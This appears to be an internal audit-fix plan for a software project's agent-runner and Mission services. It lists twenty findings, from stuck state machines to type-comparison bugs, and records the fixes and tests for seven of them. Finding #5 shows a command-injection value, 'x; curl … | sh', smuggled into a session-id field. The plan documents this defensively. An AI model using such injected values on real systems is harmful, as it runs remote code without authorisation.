# Plan 123 — Audit fixes: the runner and Mission services

## Status: In progress — 2026-11-11 — 7/20 items fixed (#1–#7, all three high ones); remaining: #8–#20

## Why

A read-only review of `services/mission/`, `runner-*.js`,
`agent-queue-mcp.js`, `prompt-templates.js`, `agent-store.js`, `pad-tmux.js`
and `plans.js` on 2026-11-11. Nothing was run. **Each finding gets a failing
test first (the runner suites drive a fake pane and a fake turn store on a
throwaway database), then the fix, then a mutation control.**

## Findings

Severity: H = high, M = medium, L = low.

| # | Sev | Where | What is wrong | Scenario |
|---|---|---|---|---|
| 1 | H | `mission/scheduler.js` `runnerWatchTick` / `runnerWatchOnce` | Only runners in state `running` are watched. Nothing observes `awaiting_receipt`, and the "no response in 10 minutes" rule in `computeSchedulerState` is unreachable | The receipt lands just after the 5-second wait: the runner sits on "Waiting for worker" for ever, and the worker's own queue updates are refused, until a human presses Reconcile or Pause |
| 2 | H | `mission/scheduler.js`; `db.js` (`last_dispatch_revision` is TEXT) | An integer revision is written and read back as a string, then compared with `!==` to an integer, so "the queue changed" is always true | A worker that goes idle without finishing is nudged for ever; the "no progress after N dispatches" stop never fires |
| 3 | H | `mission/scheduler.js` `recoverWorkerSession` → `canDispatch` | Recovering a dead pane goes through the idle gate; a TUI killed mid-turn leaves the store at `working` for ever | The PAD restarts mid tool call: every tick logs "pane dead" and returns. The runner stays `running` with no worker; Run says already running; Pause then Run refuses "worker not idle" |
| 4 | M | `mission/runner-queue-api.js` resolve | The answer is sent raw. Each line is submitted with its own Enter, but the receipt hash covers the whole text | A two-line answer arrives as two messages, the hash never matches, the runner sticks in `awaiting_receipt` and Reconcile can never match it |
| 5 | M | `mission/session-lifecycle.js` `startSession`; `drivers/opencode.js`, `claude.js`, `codex.js` `tuiLaunch.resume` | `agentSessionId` is only trimmed, then typed unquoted into the pane's shell, and retyped on every relaunch | `mission_session_start {agent_session_id: "x; curl … \| sh"}` runs a shell command in the PAD for a key without the `exec` grant |
| 6 | M | `mission/runner-queue-api.js`; `runner-queue.js`; `mission/runner-control.js` | A runner can be `paused` with a `need_input` plan, and no control leaves that state: Resolve needs `waiting_input`, Run refuses a blocked queue | Pause before next task, then the worker reports "need input"; or a resolve whose send is refused. Only hand-editing the plan's status gets out |
| 7 | M | `mission/session-lifecycle.js` `endSession` | Unlike `closeSession`, it does not stop the session's runner first | An agent closes a runner's worker session over MCP; the watcher sees a dead pane and restarts the TUI in it |
| 8 | M | `pad-tmux.js` `applyGlobalOptions` | PAD-wide tmux options are set before any session exists, which fails silently when no tmux server is running, and the PAD is memoised as done | First session on a fresh PAD, or after all sessions closed: tmux defaults are back, including the 500 ms ESC delay |
| 9 | L | `plans.js` `normalizeQueueFile`; `mission/runners.js` `createRunner` | Any `.md` in the plans folder is accepted as the queue file and overwritten without the confirmation `setupRunnerQueue` asks for | A runner created with queue file `INDEX.md`, or in a folder with a hand-written `QUEUE.md`, replaces that file |
| 10 | L | `plans.js` reserved-name check | Compares the raw string, not the resolved name | `plan_write {path: "./QUEUE.md"}` overwrites the generated queue file and halts the runner |
| 11 | L | `runner-callbacks.js` spawn | `cwd` is the project folder, a path inside the PAD. When it does not exist in the control plane the spawn error is discarded | Every callback on a default-layout project ends `unknown` with empty output |
| 12 | L | `mission/liveness.js` `BUSY_CACHE` | Never evicted | Slow unbounded growth |

Noted below the cut, each to be checked the same way:

| # | Where | What |
|---|---|---|
| 13 | `mission/runners.js` `setRunnerReason` | Overwrites `reason_code` with `runner_notice`; a refused Run while waiting on quota erases the code quota recovery keys on |
| 14 | `mission/scheduler.js` prompt misconfiguration | Stops the runner via `projection_mismatch`; the message says "Run again" but Run is refused until the queue file is regenerated |
| 15 | `mission/scheduler.js` `reconcileRunnerOperation` | Hard-codes the 10-minute timeout; throws `runner_transition_invalid` when the operation is already confirmed |
| 16 | `mission/projects.js` `deleteProject`; runner delete | No detach, no destroy callback, `QUEUE.paused` left; rows in `runner_callbacks`, `runner_usage_state`, `runner_queue_observations`, `runner_quota_recoveries` and script files are orphaned |
| 17 | `mission/runner-queue-api.js` `mutateCanonicalQueue` | The database change commits before the file is published; a publish failure reports an error for a change that stuck |
| 18 | `mission/liveness.js`; `pad-tmux.js` | One failed `list-sessions` marks every session on the PAD dead; a transient `hasTmux` failure falls through to `apt-get install tmux` |
| 19 | `plans.js` `writePlan` | `session` is written into frontmatter unescaped |
| 20 | `pad-tmux.js` `isShellCommand` | Only `sh`/`bash`/`zsh`/`dash` count as a shell, so a pane in `fish`, `vim` or a REPL is treated as an agent and `mission_send` types into it |

## Checked by the reviewer and found fine

`agentStore.readTurn` accepting a PAD name; the runtime compare-and-swap in
`persistTransition`; nested `tx.immediate()` inside `mutate`; position
handling in reorder and remove; the opencode runner-MCP wiring.

## How each fix is proven

- Tests in `runner-dispatch-invariants.test.js`,
  `runner-canonical-queue.test.js`, `mission.test.js` and `pad-tmux.test.js`,
  written to fail first. New tests get a control via `scripts/mutate.sh`.
- #8 needs one live check on a throwaway PAD:
  `tmux show-options -gv escape-time` after the first session.
- #5 is proven by the recorded argv / typed text of the fake pane, never by
  running an injected command.
- Live end-to-end runs on the real worker wait for the opencode free-usage
  limit to reset (plan 75); until then the fake-pane suites are the evidence
  and this file says so.
- `npm test` green.

## Results so far (2026-11-11)

Every fix below had a failing test first, on the fake-pane harness in
`runner-dispatch-invariants.test.js` (28 tests now) or
`runner-canonical-queue.test.js`, and a mutation control that bites.
`npm test`: 74 files, 1230 tests. No live run on the real worker: opencode's
free limit has not reset (plan 75).

| # | Fix |
|---|---|
| 1 | The periodic watch also covers `awaiting_receipt`: it runs the same reconciliation as the Reconcile button (confirm the exact receipt, or hold once the deadline has passed with the worker idle; never a resend) |
| 2 | Revisions are compared as numbers. The trace showed the stored value was the text `2.0` (a float bound into a TEXT column) against the number `2`. And the no-progress count now means what it says: consecutive nudges for an unchanged queue. It used to be reset by any conversation activity, so a worker that answered each nudge without touching its plan was never stopped |
| 3 | A turn the store calls "working" is treated as over when its pane is gone. The watch pass recovers the worker (or says why it is waiting); Run no longer answers "worker not idle" and no longer adopts a dead worker as an active turn |
| 4 | The resolve answer is normalised to one line before it is hashed and sent. The test's fake pane now submits per line, like the real one |
| 5 | `agent_session_id` must be a plain token and is refused before the PAD is touched; the three `tuiLaunch.resume` builders also strip anything else from ids already stored |
| 6 | A pause that the plan outlives by asking a question, and an answer that could not be sent, both land in `waiting_input`; Resolve also accepts paused-with-blocker |
| 7 | `endSession` stops the session's runner before killing the pane, like the page's Close |

## Progress

- [x] 1 Watch `awaiting_receipt`; unanswered sends reach hold
- [x] 2 Revision compared as a number
- [x] 3 A dead pane mid-turn is recovered or held, never ignored
- [x] 4 Resolve answer normalised before hashing and sending
- [x] 5 `agentSessionId` validated and shell-quoted
- [x] 6 Paused-with-blocker can be resolved
- [x] 7 `endSession` stops the runner first
- [ ] 8 tmux options applied when a server exists
- [ ] 9 Runner creation does not overwrite an existing file
- [ ] 10 Reserved plan names checked after resolving
- [ ] 11 Callback spawn failures recorded; `cwd` valid in the control plane
- [ ] 12 `BUSY_CACHE` bounded
- [ ] 13 `setRunnerReason` keeps the stop code
- [ ] 14 Prompt misconfiguration message matches what Run will do
- [ ] 15 Reconcile uses the shared timeout and tolerates a confirmed operation
- [ ] 16 Project and runner delete clean up after themselves
- [ ] 17 Publish failure after a committed change is reported as what it is
- [ ] 18 A failed probe is not a death
- [ ] 19 Plan frontmatter escaped
- [ ] 20 Unknown pane command is not treated as an agent
